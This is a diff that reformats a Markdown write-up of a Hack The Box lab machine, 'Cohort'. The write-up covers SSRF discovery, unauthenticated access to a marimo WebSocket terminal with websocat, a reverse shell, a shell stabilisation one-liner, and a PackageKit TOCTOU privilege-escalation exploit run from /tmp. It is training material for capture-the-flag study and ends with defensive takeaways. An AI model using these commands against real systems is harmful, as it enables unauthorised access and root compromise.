@@ -13,20 +13,8 @@ tags:
   - suid
   - mtu
   - ssl
-synced: "2026-11-02 09:58"
+synced: "2026-11-02 12:08"
 ---
-
---
-tags:
-ciber
-htb
-machine
-difficulty: Easy
-os: Linux
-status: Pwned
-ip: "10.129.131.96"
-created: 2026-10-16
---
 
 <p align="center">
   <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1fb351c-6269-49cd-8789-fc579a687c97-1781002999.png" alt="Cohort Avatar" width="220">
@@ -80,34 +68,34 @@ type: Radar
 #- chart data    -#
 #-----------------#
 data:
-item: "ENUM"
+  - item: "ENUM"
     user: "user"
     score: 5.8
-item: "REAL"
+  - item: "REAL"
     user: "user"
     score: 5.4
-item: "CVE"
+  - item: "CVE"
     user: "user"
     score: 6.7
-item: "CUSTOM"
+  - item: "CUSTOM"
     user: "user"
     score: 3.3
-item: "CTF"
+  - item: "CTF"
     user: "user"
     score: 4.6
-item: "ENUM"
+  - item: "ENUM"
     user: "author"
     score: 0
-item: "REAL"
+  - item: "REAL"
     user: "author"
     score: 0
-item: "CVE"
+  - item: "CVE"
     user: "author"
     score: 0
-item: "CUSTOM"
+  - item: "CUSTOM"
     user: "author"
     score: 0
-item: "CTF"
+  - item: "CTF"
     user: "author"
     score: 0
 
@@ -145,25 +133,25 @@ type: Column
 #- chart data    -#
 #-----------------#
 data:
-folder: "PIECE OF CAKE"
+  - folder: "PIECE OF CAKE"
     count: 324
-folder: "VERY EASY"
+  - folder: "VERY EASY"
     count: 462
-folder: "EASY"
+  - folder: "EASY"
     count: 1933
-folder: "NOT TOO EASY"
+  - folder: "NOT TOO EASY"
     count: 1355
-folder: "MEDIUM"
+  - folder: "MEDIUM"
     count: 533
-folder: "A BIT HARD"
+  - folder: "A BIT HARD"
     count: 160
-folder: "HARD"
+  - folder: "HARD"
     count: 127
-folder: "EXTREMELY HARD"
+  - folder: "EXTREMELY HARD"
     count: 47
-folder: "INSANE"
+  - folder: "INSANE"
     count: 25
-folder: "BRAINFUCK"
+  - folder: "BRAINFUCK"
     count: 54
 
 #-----------------#
@@ -195,9 +183,7 @@ options:
       alias: "Votes"
 ```
 
---
-
---
+---
 
 ## Reconnaissance
 
@@ -319,7 +305,7 @@ I exploited this using `websocat` to connect to the unprotected WebSocket termin
 
 ```shell
 websocat "wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws" \
-H "Authorization: Bearer any-value" -k
+  -H "Authorization: Bearer any-value" -k
 ```
 
 Since the WebSocket connection was unstable and lacked proper job control or a complete PTY, I used it to establish a proper reverse shell.
@@ -342,7 +328,7 @@ Once the connection was caught by the listener, I stabilized the shell using Pyt
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-(Note: If bracketed paste mode issues arise, inserting garbage characters like `\x1b[200~`, use `Ctrl+U` to clear the line without terminating the session.)*
+*(Note: If bracketed paste mode issues arise, inserting garbage characters like `\x1b[200~`, use `Ctrl+U` to clear the line without terminating the session.)*
 
 ## Privilege Escalation
 
@@ -368,7 +354,7 @@ I downloaded and executed the exploit for CVE-2026-41651 on the target:
 ```shell
 ┌──(julicc㉿arceus)-[~/cohort.htb/exploits]
 └─$ rlwrap ./websocat.x86_64-unknown-linux-musl "wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws" \
-H "Authorization: Bearer any-value" -k
+  -H "Authorization: Bearer any-value" -k
 marimo@cohort:~$
 /tmp/exploit
 /tmp/exploit
@@ -396,16 +382,16 @@ The exploit successfully swapped the files during the race window, providing a [
 
 Cohort was a very interesting machine that demonstrated the risks of SSRF leading to the discovery of internal endpoints. The initial foothold showcased a realistic pre-auth WebSocket vulnerability in `marimo`. Finally, the privilege escalation highlighted a classic TOCTOU race condition in `PackageKit`, emphasizing how package managers can be abused to gain root access if they are not handling file checks securely.
 
---
+---
 
 ## Post-Engagement & Zettelkasten Notes
 
 ### Key Takeaways & Defense
-**Pre-Auth WebSocket Protection**: Avoid exposing dev tools and notebooks (`marimo`) without robust token validation and origin checks.
-**PackageKit TOCTOU Race Condition (CVE-2026-41651)**: System package managers pinned to vulnerable versions allow local unprivileged users to win file-swapping race conditions and spawn SUID binaries.
+- **Pre-Auth WebSocket Protection**: Avoid exposing dev tools and notebooks (`marimo`) without robust token validation and origin checks.
+- **PackageKit TOCTOU Race Condition (CVE-2026-41651)**: System package managers pinned to vulnerable versions allow local unprivileged users to win file-swapping race conditions and spawn SUID binaries.
 
 ### Atomic Notes to Extract
-[[Web - Protocols - Unauthenticated WebSocket Terminal|Unauthenticated WebSocket Terminal Execution]]
-[[Web - SSRF - Internal Port Scanning and Pivoting|Server-Side Request Forgery (SSRF)]]
-[[Linux - PrivEsc - TOCTOU Race Conditions|TOCTOU Race Condition Exploitation]]
-[[Linux - PrivEsc - SUID|SUID Privilege Escalation]]
+- [[Web - Protocols - Unauthenticated WebSocket Terminal|Unauthenticated WebSocket Terminal Execution]]
+- [[Web - SSRF - Internal Port Scanning and Pivoting|Server-Side Request Forgery (SSRF)]]
+- [[Linux - PrivEsc - TOCTOU Race Conditions|TOCTOU Race Condition Exploitation]]
+- [[Linux - PrivEsc - SUID|SUID Privilege Escalation]]
